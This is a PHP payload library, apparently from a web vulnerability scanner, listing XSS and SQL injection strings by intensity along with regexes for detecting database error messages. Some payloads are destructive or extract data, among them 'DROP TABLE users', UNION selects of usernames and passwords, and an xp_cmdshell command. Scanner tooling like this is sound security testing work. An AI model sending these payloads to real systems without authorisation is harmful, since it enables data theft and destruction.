<?php
/**
 * VulnProbe — payloads.php
 * XSS and SQLi payload library with 3 intensity levels
 */

function get_xss_payloads(string $intensity): array {
    $low = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '<svg onload=alert(1)>',
    ];

    $medium = array_merge($low, [
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<details open ontoggle=alert(1)>',
        '"><img src=x onerror=alert(document.cookie)>',
        "';alert(1)//",
        '</script><script>alert(1)</script>',
        '<iframe src="javascript:alert(1)">',
        '<math><mtext></table><img src=x onerror=alert(1)>',
        '<svg><script>alert(1)</script></svg>',
        '<<SCRIPT>alert(1)//<</SCRIPT>',
    ]);

    $high = array_merge($medium, [
        '<script>alert(document.domain)</script>',
        '<img src="javascript:alert(1)">',
        '<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        '<div onmouseover="alert(1)">hover me</div>',
        '<a href="javascript:alert(1)">click</a>',
        '"><svg/onload=alert(1)>',
        '`><svg onload=alert(1)>',
        '<ScRiPt>alert(1)</ScRiPt>',
        '<video><source onerror="alert(1)">',
        '%3cscript%3ealert(1)%3c/script%3e',
        '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
        '<marquee onstart=alert(1)>',
        '<select autofocus onfocus=alert(1)>',
        '<textarea autofocus onfocus=alert(1)>',
    ]);

    return match($intensity) {
        'medium' => $medium,
        'high'   => $high,
        default  => $low,
    };
}

function get_sqli_payloads(string $intensity): array {
    $low = [
        "'",
        '"',
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1--",
    ];

    $medium = array_merge($low, [
        "1' OR '1'='1",
        "admin'--",
        "' OR 1=1#",
        "') OR ('1'='1",
        "1; DROP TABLE users--",
        "' UNION SELECT NULL--",
        "' UNION SELECT 1,2,3--",
        "1 AND 1=1",
        "1 AND 1=2",
        "' AND sleep(2)--",
    ]);

    $high = array_merge($medium, [
        "' UNION SELECT username,password FROM users--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--",
        "'; EXEC xp_cmdshell('dir')--",
        "' OR EXISTS(SELECT * FROM users)--",
        "1 OR 1=1 LIMIT 1--",
        "' OR 'x'='x",
        "0x27 OR 0x31=0x31",
        "\" OR \"\"=\"",
        "') OR ('x')=('x",
        "'; INSERT INTO users VALUES('hacked','hacked')--",
        "' GROUP BY columnnames having 1=1--",
        "' ORDER BY 1--",
        "' ORDER BY 100--",
        "1; SELECT * FROM information_schema.tables--",
        "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
    ]);

    return match($intensity) {
        'medium' => $medium,
        'high'   => $high,
        default  => $low,
    };
}

/**
 * SQL error signatures to detect in responses
 */
function get_sqli_error_patterns(): array {
    return [
        '/sql syntax/i'                          => 'MySQL syntax error exposed',
        '/mysql_fetch/i'                         => 'MySQL fetch function error',
        '/ORA-\d{5}/i'                           => 'Oracle DB error code exposed',
        '/Microsoft OLE DB Provider/i'           => 'MSSQL OLE DB error',
        '/Unclosed quotation mark/i'             => 'MSSQL unclosed quote error',
        '/pg_query\(\)/i'                        => 'PostgreSQL query error',
        '/SQLiteException/i'                     => 'SQLite exception exposed',
        '/com\.mysql\.jdbc/i'                    => 'Java MySQL JDBC error',
        '/PDOException/i'                        => 'PHP PDO exception exposed',
        '/SQLSTATE\[/i'                          => 'SQLSTATE error code exposed',
        '/you have an error in your sql/i'       => 'MySQL generic SQL error',
        '/warning.*mysql_/i'                     => 'PHP MySQL warning',
        '/supplied argument is not a valid mysql/i' => 'Invalid MySQL argument',
        '/column count doesn\'t match/i'         => 'Column mismatch (UNION likely)',
        '/table.*doesn\'t exist/i'               => 'Table name exposed in error',
        '/division by zero/i'                    => 'Arithmetic error in SQL',
        '/invalid query/i'                       => 'Generic invalid query error',
    ];
}
